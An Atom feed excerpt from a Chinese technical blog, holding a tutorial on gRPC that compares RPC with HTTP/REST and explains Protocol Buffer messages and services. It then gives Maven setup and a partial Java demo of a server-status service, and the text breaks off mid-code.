<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>f10@t&#39;s blog</title>
  
  <subtitle>St@y HuNgRy, St@y f00l1sh.</subtitle>
  <link href="https://lzwgiter.github.io/atom.xml" rel="self"/>
  
  <link href="https://lzwgiter.github.io/"/>
  <updated>2023-07-05T06:22:28.349Z</updated>
  <id>https://lzwgiter.github.io/</id>
  
  <author>
    <name>lzwgiter</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>gRPC简介与使用</title>
    <link href="https://lzwgiter.github.io/posts/479daa6d.html"/>
    <id>https://lzwgiter.github.io/posts/479daa6d.html</id>
    <published>2023-07-03T02:31:33.000Z</published>
    <updated>2023-07-05T06:22:28.349Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>gRPC是谷歌设计的一个开源RPC（Remote ProcessCall）框架，其基于谷歌开发的<ahref="https://protobuf.dev/overview/">ProtocolBuffer</a>（也支持其他数据结构如JSON、XML等），并充分吸收了提供了一种分布式系统内部各个微服务之间互相调用的方法，具有语言无关、平台无关、高效（HTTP/2）、安全（TLS）、可扩展性强的特点，已被广泛应用于诸多公司如：NetFlex、Square、Cisco等。</p><p><img src="/img/gRPC简介与使用/image-20230701104730528.png" /></p></blockquote><span id="more"></span><h1 id="rpc-or-http">RPC or HTTP?</h1><p>正式学习之前讨论一个有意思的话题，即RPC技术和HTTP协议在分布式系统中，有何区别呢？</p><h2 id="目的及区别">目的及区别</h2><p>一个自然的问题就是，RPC和HTTP都可以实现C/S之间的沟通，比如现行的微服务架构中，提倡RESTful风格，服务与服务之间都是通过暴露HTTPendpoint并通过HTTP协议、JSON数据格式进行通信的。而RPC也广泛应用于分布式系统内部各个服务之间的互相调用，比如JavaRMI技术以及今天学习的gRPC框架。</p><blockquote><p>那区别和要解决的问题是什么呢？</p></blockquote><p>总的来说，个人理解区别如下：</p><ul><li>RPC多用于分布式系统中，HTTP多用于B/S架构。</li><li>RPC关注点是网络通信的本地透明化，HTTP关注点是WWW上资源的访问</li></ul><p>下面具体讨论一下二者出现要解决的问题和区别。从出现时间上来讲，<strong>RPC出现的时间是要比HTTP早的</strong>。</p><p>根据wiki描述，1960年代就出现了分布式计算中的<code>Request-Response</code>协议，1970年代出现了RPC的模型，如ARPANET（早期互联网）文档中就有采用，1980年代有了一些实用的实现。而<em>RemoteProcess Call(RPC)</em>一词是由Bruce Jay Nelson于1981年提出的。</p><blockquote><p>a <strong>remote procedure call</strong> (<strong>RPC</strong>) iswhen a computer program causes a procedure (subroutine) to execute in adifferent address space (commonly on another computer on a sharednetwork), which is written as if it were a normal (local) procedurecall, without the programmer explicitly writing the details for theremote interaction.</p></blockquote><p>而HTTP——<em>Hypertext TransferProtocol</em>超文本传输协议则于1989年由<code>Tim Berners-Lee</code>提出，第一个版本HTTP/1.0于1996年提出，现在已经到了HTTP/3.0版本（2022年），是现代互联网数据通信的基石。</p><blockquote><p>The <strong>Hypertext Transfer Protocol</strong>(<strong>HTTP</strong>) is an application layer protocol in the Internetprotocol suite model for distributed, collaborative, hypermediainformation systems.</p></blockquote><p>所以这两个协议设计之初的场景就有所区别，RPC技术（我理解RPC是技术而不是协议）是为了提供分布式计算场景下、不同实体上进程的通信所设计的技术，且要实现<strong>本地透明化调用的效果</strong>，像调用本地方法一样调用另一个机器上的方法，不对上层业务逻辑代码产生影响。</p><p>而HTTP协议是为了让客户端能能够访问WWW上的资源（文本、图像、视频）而设计的协议，并设计了大量的状态码来标识状态。因此从这个角度，<strong>HTTP协议更多用于B/S架构，而RPC更多用于C/S</strong>。</p><h2 id="restful为什么不用rpc呢">RESTful为什么不用RPC呢？</h2><p>当然，也不是说HTTP不能用于C/S。</p><p>我们回到开始我提到的例子，RESTful风格就提倡使用HTTP，那为什么不用RPC呢？这里就需要稍微了解下RESTful风格（于2000年由RoyFielding博士论文中提出）了。</p><p>RESTful——<em>Resource Representational StateTransfer(表示层状态转移)</em>之所以RESTful风格选择HTTP的原因在于，RESTful的关注点在<strong>Representational</strong>，即<strong>资源的表示</strong>，提倡将服务的资源以可读的方式表示出来，如JSON、XML等，并通过HTTP提供的方法GET、POST、PUT、DELETE执行状态，使得服务端的服务发生状态变化（<em>StateTransfer</em>）。比如SpringBoot应用中，大家可能用过HATEOAS组件，实现向客户端返回相关资源链接的效果。比如我们访问api.github.com，从相应的json中就可以得到所有的资源及其对应的链接。</p><p><img src="/img/gRPC简介与使用/image-20230705130416414.png" /></p><p><strong>单纯使用HTTP替换掉RPC技术是可行的，但是意义不大。</strong>RESTful中定义的动作（GET、POST、PUT、DELETE），HTTP的一些状态码、特别是传输的格式（JSON、XML）没有太大的意义，个人理解原因如下：</p><ul><li>服务之间的调用不需要<strong>动作</strong>的概念，只是简单的调用</li><li>HTTP大量的状态码对于分布式系统中需要考虑的三态（超时、成功、失败）来说是冗余的</li><li>进程之间传输的数据不需要<strong>可读</strong>这个属性</li></ul><p>因此，LeonardRichardson也提出了REST成熟度模型，上述提到的、单纯使用HTTP替换掉RPC的方式就属于成熟度最低的Level0，有兴趣可以进一步阅读：<ahref="https://martinfowler.com/articles/richardsonMaturityModel.html">RichardsonMaturity Model (martinfowler.com)</a></p><p><img src="/img/gRPC简介与使用/overview.png" /></p><h1 id="protocol-buffer基本概念">Protocol Buffer基本概念</h1><blockquote><p>ProtocolBuffer有两个版本v2和v3，前者是后者子集。详细概念阐述、代码例子可以参考：<ahref="https://grpc.io/docs/what-is-grpc/core-concepts/">Core concepts,architecture and lifecycle | gRPC</a>、<ahref="https://grpc.io/docs/languages/java/basics/">Basics tutorial |Java | gRPC</a></p></blockquote><p>ProtocolBuffer在谷歌内部有广泛的应用，包括不限于服务器内部通信、存档数据的存储等。</p><p>正如名字所言，protobuf中的核心就是<em>protocol</em>，即<strong>协议</strong>。个人理解，协议即是定义实体之间交互的方式方法流程，用于实现某个特定目的，<strong>就像函数一样</strong>。因此我们也可以将这个过程抽象一下，得到协议<strong>方法</strong>（<code>services</code>）和所用到的特定<strong>消息</strong>（<code>message</code>），而这两个元素也正是使用protobuf时我们需要定义的内容，通常写在文件<code>.proto</code>文件中。</p><h2 id="message">message</h2><p>一个简单的<strong>消息</strong>定义如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个搜索请求</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">SearchRequest</span> &#123;</span><br><span class="line"><span class="type">string</span> query = <span class="number">1</span>;</span><br><span class="line"><span class="type">int32</span> page_number = <span class="number">2</span>;</span><br><span class="line"><span class="type">int32</span> results_per_page = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上我们定义了一个查询请求的<strong>消息结构</strong>，<code>syntax</code>关键字的值代表我们所使用的protobuf的版本，下面的<code>message</code>关键字开始描述了一个名为<code>SearchRequest</code>的消息的结构，包含三个属性，每个属性由类型和数值组成。这样就完成了一条消息格式的编写了。</p><p>这里需要注意，上面例子中的数值并非是<strong>默认值</strong>的含义，而是类似序号的含义，他们唯一标识了消息中的字段，官方也指出了序号的规则：</p><ul><li>对于一个message，每个字段的序号必须是独一无二的</li><li>序号<code>19000</code>~<code>19999</code>属于protobuf的保留序号</li><li>我们不能使用保留序号，且使用序号的范围是<code>1</code>~<code>536870911</code></li></ul><p>通常情况下1-15的序号就够我们用了，一则没那么多变量需要定义，二则15-2047之间就需要两个字节来记录了，会产生更大的数据包。</p><h2 id="services">services</h2><p>在定义好消息之后，我们就可以定义使用消息进行交互的协议了。假设我们定义一个协议，发送方发送一个搜索请求给接收方，接收方回复一个搜索结果，那么我们可以将该过程定义出来：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">service </span><span class="title class_">SearchService</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Search(SearchRequest) <span class="keyword">returns</span> (SearchResponse)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="工作流程">工作流程</h2><p>当我们定义好了消息和服务方法后，我们就可以使用官方提供的编译器进行编译了：<ahref="https://protobuf.dev/downloads/">Downloads | Protocol BuffersDocumentation (protobuf.dev)</a></p><p>该编译器支持输出Python、Java、C++等语言的代码，我们可以利用这些代码提供的API实现RPC调用。向pom依赖中添加如下依赖和插件，具体可见官方的<ahref="https://github.com/grpc/grpc-java/blob/master/README.md">README</a>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-netty-shaded<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.56.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-protobuf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.56.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-stub<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.56.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span> <span class="comment">&lt;!-- necessary for Java 9+ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>annotations-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.53<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">extensions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">extension</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>kr.motd.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>os-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">extensions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xolstice.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>protobuf-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">protocArtifact</span>&gt;</span>com.google.protobuf:protoc:3.22.3:exe:$&#123;os.detected.classifier&#125;<span class="tag">&lt;/<span class="name">protocArtifact</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pluginId</span>&gt;</span>grpc-java<span class="tag">&lt;/<span class="name">pluginId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pluginArtifact</span>&gt;</span>io.grpc:protoc-gen-grpc-java:1.56.0:exe:$&#123;os.detected.classifier&#125;<span class="tag">&lt;/<span class="name">pluginArtifact</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile-custom<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果是idea，可以在右侧的mvn中看到protobuf的插件：</p><p><img src="/img/gRPC简介与使用/image-20230705112745589.png" style="zoom:67%;" /></p><p>这样在maven进行compile时就会自动生成代码了。</p><h1 id="一个demo">一个Demo</h1><p>下面写一个简单的Demo，首先定义消息和协议方法，实现查看我一个小板子的一些状态信息。定义枚举、消息、协议如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> status;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定输出的目录名称</span></span><br><span class="line"><span class="keyword">option</span> java_package = <span class="string">&quot;TinyServer&quot;</span>;</span><br><span class="line"><span class="comment">// 指定输出的Java类的名称</span></span><br><span class="line"><span class="keyword">option</span> java_outer_classname = <span class="string">&quot;StatusServiceProtos&quot;</span>;</span><br><span class="line"><span class="comment">// 输出多个Java包装类</span></span><br><span class="line"><span class="keyword">option</span> java_multiple_files = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum </span><span class="title class_">StatusOptions</span> &#123;</span><br><span class="line">  CPU_USAGE = <span class="number">0</span>;  <span class="comment">// 查看CPU使用率</span></span><br><span class="line">  MEM_USAGE = <span class="number">1</span>;  <span class="comment">// 查看内存使用量</span></span><br><span class="line">  KERNEL = <span class="number">2</span>;     <span class="comment">// 查看操作系统分支</span></span><br><span class="line">  TIME = <span class="number">3</span>;       <span class="comment">// 查看系统时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">StatusRequest</span> &#123;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">int32</span> requestOpt = <span class="number">1</span>;  <span class="comment">// 请求操作数，即上面StatusOptions中定义的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">StatusResponse</span> &#123;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">string</span> statusReport = <span class="number">1</span>;  <span class="comment">// 返回数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">service </span><span class="title class_">ServerStatus</span> &#123;</span><br><span class="line">  <span class="comment">// 服务器状态查询</span></span><br><span class="line">  <span class="comment">// 给定查询状态的指标，返回状态值</span></span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> QueryIndex(StatusRequest) <span class="keyword">returns</span>(StatusResponse) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用mavencompile对项目进行编译，在target目录下我们可以得到这protobuf为我们生成的代码：</p><p><img src="/img/gRPC简介与使用/image-20230705104947828.png" style="zoom:80%;" /></p><p>在这个生成的<code>xxxGrpc</code>的类中包含了我们服务端和客户端代码需要依赖的类：</p><p><img src="/img/gRPC简介与使用/image-20230705105125851.png" alt="image-20230705105125851" style="zoom:67%;" /></p><p>其中<code>xxxImplBase</code>是我们服务端，编写服务时需要继承并覆写方法的类；而<code>xxxStub</code>则是客户端与服务端沟通使用的类，又分为三种：</p><ul><li>xxxStub：异步IO模式</li><li>xxxBlockingStub：即同步的，等待服务器响应期间保持阻塞状态</li><li>xxxFutureStub：既可以当异步也可以当同步，Future机制</li></ul><h2 id="服务端">服务端</h2><p>下面我们编写服务端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io.grpc.Grpc;</span><br><span class="line"><span class="keyword">import</span> io.grpc.InsecureServerCredentials;</span><br><span class="line"><span class="keyword">import</span> io.grpc.Server;</span><br><span class="line"><span class="keyword">import</span> io.grpc.stub.StreamObserver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.management.OperatingSystemMXBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> TinyServer.ServerStatusGrpc;</span><br><span class="line"><span class="keyword">import</span> TinyServer.StatusOptions;</span><br><span class="line"><span class="keyword">import</span> TinyServer.StatusRequest;</span><br><span class="line"><span class="keyword">import</span> TinyServer.StatusResponse;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查看服务器远程状态包括CPU占用率、可用内存、os分支、系统时间</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/7/3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TinyStatusServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> Logger.getLogger(TinyStatusServer.class.getName());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String port;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Server server;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TinyStatusServer</span><span class="params">(String port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">        <span class="built_in">this</span>.server = Grpc.newServerBuilderForPort(Integer.parseInt(port), InsecureServerCredentials.create())</span><br><span class="line">                .addService(<span class="keyword">new</span> <span class="title class_">StatusServiceImpl</span>())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startServer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            server.start();</span><br><span class="line">            logger.info(<span class="string">&quot;状态服务启动成功！监听端口：&quot;</span> + port);</span><br><span class="line">            Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                System.err.println(<span class="string">&quot;*** JVM已停止&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    TinyStatusServer.<span class="built_in">this</span>.stopServer();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                System.err.println(<span class="string">&quot;*** 服务关闭&quot;</span>);</span><br><span class="line">            &#125;));</span><br><span class="line">            server.awaitTermination();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;端口已被占用！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stopServer</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">if</span> (server != <span class="literal">null</span>) &#123;</span><br><span class="line">            server.shutdown().awaitTermination(<span class="number">5</span>, TimeUnit.SECONDS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StatusServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServerStatusGrpc</span>.ServerStatusImplBase &#123;</span><br><span class="line">        <span class="keyword">private</span> StatusResponse <span class="title function_">getResult</span><span class="params">(StatusRequest request)</span> &#123;</span><br><span class="line">            <span class="type">OperatingSystemMXBean</span> <span class="variable">operatingSystemMXBean</span> <span class="operator">=</span> (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();</span><br><span class="line">            String result;</span><br><span class="line">            <span class="keyword">switch</span> (request.getRequestOpt()) &#123;</span><br><span class="line">                <span class="keyword">case</span> StatusOptions.CPU_USAGE_VALUE:</span><br><span class="line">                    result = String.valueOf(operatingSystemMXBean.getSystemLoadAverage());</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> StatusOptions.MEM_USAGE_VALUE:</span><br><span class="line">                    result = (operatingSystemMXBean.getTotalPhysicalMemorySize()</span><br><span class="line">                            - operatingSystemMXBean.getFreePhysicalMemorySize()) / (<span class="number">1024</span> * <span class="number">1024</span>) + <span class="string">&quot;MB&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> StatusOptions.KERNEL_VALUE:</span><br><span class="line">                    result = operatingSystemMXBean.getArch();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> StatusOptions.TIME_VALUE:</span><br><span class="line">                    <span class="type">SimpleDateFormat</span> <span class="variable">format</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">                    ;</span><br><span class="line">                    result = format.format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    result = <span class="string">&quot;未知的操作数！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> StatusResponse.newBuilder()</span><br><span class="line">       